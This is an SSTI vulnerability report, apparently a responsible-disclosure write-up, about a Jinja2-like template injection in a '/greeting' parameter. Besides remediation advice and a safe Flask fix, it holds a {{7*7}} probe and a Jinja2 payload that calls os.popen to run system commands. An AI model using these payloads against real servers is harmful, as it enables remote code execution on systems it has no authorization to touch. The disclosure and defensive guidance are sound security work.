# 🐞 Server-Side Template Injection (SSTI) Vulnerability Report

---

## 📌 Title

**Server-Side Template Injection (SSTI) Vulnerability in Template Rendering Engine**

---

## 📝 Description

The application is vulnerable to **Server-Side Template Injection (SSTI)**. This vulnerability occurs when user input is directly embedded into a server-side template without proper sanitization or validation. If the template engine evaluates this input, an attacker can inject template expressions to execute arbitrary server-side code.

SSTI affects various templating engines such as:

- Jinja2 (Python)
- Twig (PHP)
- Velocity (Java)
- Smarty (PHP)
- Freemarker (Java)
- Go templates

This type of vulnerability can lead to **Remote Code Execution (RCE)**, sensitive data exposure, denial of service, or complete server compromise.

---

## 🕵️‍♂️ Vulnerable Parameter

- **Parameter**: `name`
- **HTTP Method**: `GET`
- **Endpoint**: `/greeting`

---

## 📂 Proof of Concept (PoC)

### 🔗 Malicious Request

```http
GET /greeting?name={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```

### 📥 Response Example

```html
Hello 49
```

This confirms the server is evaluating template expressions, indicating a Jinja2-like template engine is in use. This allows arbitrary expression execution.

---

## 🎯 Impact

- **Remote Code Execution (RCE)**: If the template engine allows method access, attackers can run system commands.
- **Sensitive Information Disclosure**: Access to environment variables, configs, etc.
- **Denial of Service**: Injecting recursive or infinite expressions.
- **Privilege Escalation**: If chained with other flaws.

---

## 🧪 Steps to Reproduce

1. Open a browser or proxy tool (like Burp Suite).
2. Send the following request:

```http
GET /greeting?name={{7*7}} HTTP/1.1
Host: vulnerable-website.com
```

3. If the server responds with `Hello 49`, SSTI is confirmed.

4. Further payloads (for testing only in authorized environments):

```jinja2
{{config}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

---

## ⚙️ Affected Components

- Template rendering engine (e.g., Jinja2, Twig)
- Input not sanitized before being passed into template context
- Dynamic web pages that reflect input directly into server-rendered templates

---

## 🛡️ Recommended Remediation

- **Do not** pass user input directly to templates.
- **Use context separation**: avoid mixing logic and data.
- **Sanitize inputs**: whitelist input formats and patterns.
- Use template sandboxing or rendering context without dangerous global objects.
- **Upgrade** template engines to latest versions with security patches.
- Use strict template modes (e.g., `autoescape=True` in Jinja2).

---

## 🔧 Example Fix (Python + Jinja2)

```python
from flask import render_template, request

@app.route("/greeting")
def greeting():
    user_input = request.args.get("name")
    # Do NOT do this:
    # return render_template_string("Hello " + user_input)
    
    # Safe approach
    return render_template("greeting.html", name=user_input)
```

---

## 🔐 Security Best Practices

- Never evaluate templates with untrusted user data.
- Sanitize and validate all user inputs.
- Use separate template rendering contexts for user input.
- Disable template features that allow code execution (if possible).
- Perform code audits and fuzzing for template injection points.
- Implement Web Application Firewalls (WAF) to detect common payloads.

---

## 🧾 References

- [OWASP: Server-Side Template Injection](https://owasp.org/www-community/attacks/Server-Side_Template_Injection)
- [PortSwigger: SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [HackTricks: SSTI Cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

---

## 📅 Report Date

**2025-06-17**

---

## 🧑‍💻 Reported By

- **Security Researcher**: raghav  
- **Tools Used**: Burp Suite, Manual Testing  
- **Severity**: **Critical**

---

> ✅ **Disclaimer:** This report is submitted for responsible disclosure.
